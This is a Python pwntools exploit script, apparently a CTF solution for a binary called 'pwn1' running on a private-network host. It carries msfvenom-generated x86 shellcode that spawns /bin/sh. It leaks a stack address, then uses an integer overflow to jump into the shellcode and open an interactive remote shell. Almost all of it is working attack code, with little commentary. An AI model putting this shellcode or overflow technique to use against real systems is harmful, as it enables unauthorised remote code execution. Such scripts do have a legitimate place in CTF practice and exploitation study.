#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-06 08:01:08
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug",arch='i386')


# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
buf =  ""
buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
buf += "\xfd\x10\xf9"

shellcode = buf

DEBUG = 0
target = "./pwn1"
remote_ip = "192.168.245.179"
port =  5558
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

payload  = p32(0x65736264)
payload += "1"
payload += p32(0) # v4  
payload += "\x01" # v12 y width  malloc chunk1 and chunk2

# stage 1 leak char addr ,the point to string_start_addr
payload += "a"*0x20
payload += p32(0x400-0xa) # offset
payload += p32(0x4)

sl(payload)
ru("tMe~~~\n")
stack_addr = u32(ru("\n")[-5:-1]) - 0xa -0x26
print "stack_addr="+hex(stack_addr)


# stage 2 change point by int_overflow and exec shellcode
# gdb.attach(p,"b*0x804885B\nc")



payload  = p32(0x65736264)
payload += "1"
payload += p32(0) # v4  
payload += "\x02" # v12 y width  malloc chunk1 and chunk2

payload += "a"*0x20
payload += p32(len(payload)+0x8 - 0xa) # offset
payload += p32(-0xeeee & 0xffffffff)


payload += "a"*(0x8+0xb0-0x30)

payload += p32(stack_addr+len(payload)+4)
payload += p32(stack_addr+len(payload)+4)

payload += shellcode

# payload += "a"*(0x20-2)
# payload += p32(0x400-0xa-0x26) # offset
# payload += p32(-0x1 & 0xffffffff) # length
# payload += (0x9+0x8+0xb0-0x30-len(payload))*"a"
# payload += p32(0x8049D7C)


sl(payload)
ru("tMe~~~\n")

p.interactive()